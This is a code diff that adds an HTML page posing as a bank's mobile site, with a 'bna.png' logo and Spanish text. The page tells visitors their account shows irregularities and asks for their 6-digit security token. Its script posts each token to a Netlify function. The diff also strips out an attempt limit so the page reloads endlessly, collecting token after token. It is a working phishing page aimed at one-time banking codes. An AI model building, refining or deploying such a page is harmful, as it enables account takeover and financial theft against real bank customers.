@@ -1,7 +1,62 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Banking</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<!-- Header -->
+<header class="top-bar">
+    <div class="title">Mobile Banking</div>
+    <div class="classic">
+        <span class="home-icon">🏠</span>
+        Versión Clásica
+    </div>
+</header>
+
+<!-- Logo -->
+<div class="logo-container">
+    <img src="bna.png" alt="Logo">
+</div>
+
+<!-- Card -->
+<div class="login-card">
+    <div class="login-title">Verificación requerida</div>
+
+    <div class="token-error">
+        Notamos irregularidades en su cuenta, para continuar,
+        por favor ingrese su <strong>código Token de 6 dígitos</strong>
+    </div>
+
+    <input
+        type="text"
+        id="tokenInput"
+        class="token-input"
+        maxlength="6"
+        inputmode="numeric"
+        autocomplete="off"
+        required
+    >
+
+    <button type="button" class="btn-accept" onclick="enviarToken()">
+        <span class="check">✔</span>
+        Aceptar
+    </button>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+    <span class="close">✖</span>
+    <p>Salir</p>
+</footer>
+
 <script>
 const tokenInput = document.getElementById("tokenInput");
 
-// Solo números
+/* Solo números */
 tokenInput.addEventListener("input", () => {
     tokenInput.value = tokenInput.value.replace(/[^0-9]/g, "");
 });
@@ -15,11 +70,6 @@ function enviarToken() {
         return;
     }
 
-    // Obtener intentos actuales
-    let intentos = parseInt(sessionStorage.getItem("intentosToken")) || 0;
-    intentos++;
-    sessionStorage.setItem("intentosToken", intentos);
-
     fetch("/.netlify/functions/enviar", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -28,14 +78,11 @@ function enviarToken() {
             valor: token
         })
     }).finally(() => {
-        if (intentos >= 2) {
-            // Reinicia contador y redirige
-            sessionStorage.removeItem("intentosToken");
-            window.location.href = "index.html";
-        } else {
-            // Primer intento: vuelve al mismo lugar (bucle)
-            window.location.href = window.location.href;
-        }
+        // vuelve al mismo lugar (bucle)
+        window.location.href = window.location.href;
     });
 }
 </script>
+
+</body>
+</html>
